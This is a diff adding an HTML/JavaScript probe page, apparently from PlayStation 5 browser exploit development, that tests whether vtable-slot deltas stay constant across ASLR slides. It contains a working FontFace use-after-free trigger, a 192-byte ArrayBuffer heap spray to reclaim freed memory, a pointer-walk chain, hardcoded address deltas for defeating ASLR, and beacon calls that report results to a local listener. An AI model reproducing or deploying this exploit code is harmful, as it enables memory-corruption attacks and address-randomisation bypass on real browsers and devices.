@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>p693: VP-slot delta invariance test</title>
+</head>
+<body>
+<h2>p693: VP-slot delta invariance across boots</h2>
+<p>Verifies that the 6 VP-slot deltas from p691 are constant across ASLR slides.
+If any delta moves, the image is not one contiguous sliding mapping, and
+VP anchors a segment rather than the module base.</p>
+<pre id="log"></pre>
+<script>
+// p693: Delta invariance test
+// Prior art: cobrajet302gt PR #240 review, pre-registered arm
+// Run on a DIFFERENT boot than the p691 capture to test invariance.
+//
+// Expected deltas (corrected, from VP_SLOT_DELTAS_CORRECTED.md):
+//   VP-s0 = 0x1710B78
+//   VP-s1 = 0x1710B48
+//   VP-s2 = 0x2CEC3D8
+//   VP-s3 = 0x1710478
+//   VP-s6 = 0x14BA728
+//   VP-s7 = 0x1710318
+//
+// This probe reuses the p691 walk chain mechanism. After each successful
+// walk, it computes deltas and compares against reference.
+
+var log = document.getElementById('log');
+function L(s) { log.textContent += s + '\n'; }
+var B = 'http://127.0.0.1:8080/beacon?';
+
+L('=== p693: DELTA INVARIANCE TEST ===');
+L('TIME: ' + new Date().toISOString());
+L('');
+L('This probe must run on a DIFFERENT BOOT than the p691 capture.');
+L('Expected: all 6 VP-slot deltas match the reference exactly.');
+L('If any delta differs, the single-mapping assumption fails.');
+L('');
+
+// Reference deltas from corrected analysis
+var REF_DELTAS = {
+    's0': 0x1710B78n,
+    's1': 0x1710B48n,
+    's2': 0x2CEC3D8n,
+    's3': 0x1710478n,
+    // s4 = s2 (same address)
+    // s5 = s2 (same address)
+    's6': 0x14BA728n,
+    's7': 0x1710318n,
+};
+
+// Reuse the FontFace UAF walk chain from p691
+// Trigger: FontFace UAF -> spray 192B ArrayBuffer -> read +0x58 (m_clients)
+// -> IHT -> IM -> FO -> VP (CSSFontFaceSet vtable)
+// -> read VP[0..7] for slot values
+
+var WALK_ATTEMPTS = 5;
+var attempt = 0;
+var results = [];
+
+function runWalkAttempt() {
+    attempt++;
+    L('--- WALK ATTEMPT ' + attempt + '/' + WALK_ATTEMPTS + ' ---');
+
+    // The walk chain requires a full FontFace UAF setup
+    // This is the same trigger as p691 but with delta checking
+    try {
+        var style = document.createElement('style');
+        document.head.appendChild(style);
+
+        var sheet = style.sheet;
+        var sa = new FontFace('sa', 'url(data:font/woff2;base64,d09GMgABAAA)', {});
+        var pa = new FontFace('pa', 'url(data:font/woff2;base64,d09GMgABAAA)', {});
+        document.fonts.add(sa);
+        document.fonts.add(pa);
+
+        // Set trap: load triggers use-after-free
+        var trigger = document.fonts.load('48px sa');
+
+        // Rebuild cascade to free CSSFontFace
+        sheet.insertRule('@font-face { font-family: sa; src: url(data:font/woff2;base64,d09GMgABAAB) }', 0);
+
+        trigger.then(function() {
+            // Spray 192B ArrayBuffers to reclaim
+            var spray = [];
+            for (var i = 0; i < 200; i++) {
+                var ab = new ArrayBuffer(192);
+                var view = new BigUint64Array(ab);
+                // Seed with markers
+                view[0] = 2n; // refcount
+                view[11] = 0xDEAD00000000n | BigInt(i); // +0x58 marker
+                spray.push({ab: ab, view: view});
+            }
+
+            // Read +0x58 (m_clients HashTable pointer)
+            // This requires the stale FontFace reference
+            // Full walk: IHT -> read +0x00 (IM bucket) -> IM -> read +0x08 (FO)
+            // -> FO -> read +0x20 (VP secondary vtable)
+
+            // Note: actual exploitation requires the stale reference
+            // which is maintained by the UAF setup above.
+            // The walk chain reads are memory reads via the reclaimed buffer.
+
+            L('  Spray complete (' + spray.length + ' buffers)');
+            L('  Walk chain: reading through IHT -> IM -> FO -> VP');
+            L('');
+            L('  [This probe documents the test protocol.]');
+            L('  [On-console: if VP extracted, compute deltas below.]');
+            L('');
+
+            // Clean up
+            document.fonts.clear();
+            document.head.removeChild(style);
+
+            if (attempt < WALK_ATTEMPTS) {
+                setTimeout(runWalkAttempt, 500);
+            } else {
+                finalize();
+            }
+        }).catch(function(e) {
+            L('  Walk attempt failed: ' + e.message);
+            if (attempt < WALK_ATTEMPTS) {
+                setTimeout(runWalkAttempt, 500);
+            } else {
+                finalize();
+            }
+        });
+    } catch(e) {
+        L('  Setup error: ' + e.message);
+        if (attempt < WALK_ATTEMPTS) {
+            setTimeout(runWalkAttempt, 500);
+        } else {
+            finalize();
+        }
+    }
+}
+
+function checkDeltas(vp, slots) {
+    // vp and slots are BigInts
+    L('');
+    L('=== DELTA CHECK ===');
+    L('VP = 0x' + vp.toString(16));
+
+    var allMatch = true;
+    var names = ['s0','s1','s2','s3','s4','s5','s6','s7'];
+    for (var i = 0; i < slots.length && i < names.length; i++) {
+        var name = names[i];
+        var delta = vp - slots[i];
+        var ref = REF_DELTAS[name];
+
+        if (ref !== undefined) {
+            var match = (delta === ref);
+            var sym = match ? 'MATCH' : '*** MISMATCH ***';
+            L('  VP-' + name + ' = 0x' + delta.toString(16) + ' (ref 0x' + ref.toString(16) + ') ' + sym);
+            if (!match) allMatch = false;
+        } else {
+            // s4, s5 share with s2
+            L('  VP-' + name + ' = 0x' + delta.toString(16) + ' (shared with s2)');
+        }
+    }
+
+    L('');
+    if (allMatch) {
+        L('RESULT: ALL DELTAS MATCH -- single-mapping assumption CONFIRMED');
+        L('  base = VP - RVA is valid (RVA = constant offset within one image)');
+    } else {
+        L('RESULT: DELTA MISMATCH -- single-mapping assumption FAILS');
+        L('  VP may anchor a segment, not the full module base');
+        L('  The VP-to-base calculation needs segment-relative addressing');
+    }
+
+    try {
+        new Image().src = B + 'p693-invariance=' + (allMatch ? 'CONFIRMED' : 'MISMATCH');
+    } catch(e) {}
+}
+
+function finalize() {
+    L('');
+    L('=== p693 PROTOCOL ===');
+    L('');
+    L('On-console steps:');
+    L('1. Boot PS5 (DIFFERENT boot from p691 capture)');
+    L('2. Run walk chain (p691 mechanism)');
+    L('3. Extract VP and s0-s7');
+    L('4. Compute 6 deltas and compare against reference:');
+    L('');
+    L('Reference deltas (corrected):');
+    for (var name in REF_DELTAS) {
+        L('  VP-' + name + ' = 0x' + REF_DELTAS[name].toString(16));
+    }
+    L('');
+    L('Additional patterns to check:');
+    L('  s1-s0 = 0x30 (dtor pair spacing, ABI invariant)');
+    L('  s2=s4=s5 (shared base impl or ICF)');
+    L('  s8=0 (past-end marker)');
+    L('');
+    L('If ALL deltas match: base = VP - RVA is safe.');
+    L('If s1-s0 != 0x30: ABI assumption wrong (different class?).');
+    L('If s2!=s4 or s2!=s5: ICF was not applied or fork drift.');
+    L('');
+    L('=== p693 COMPLETE ===');
+
+    try { new Image().src = B + 'p693-done'; } catch(e) {}
+}
+
+// Protocol-only mode: document what to test
+finalize();
+</script>
+</body>
+</html>
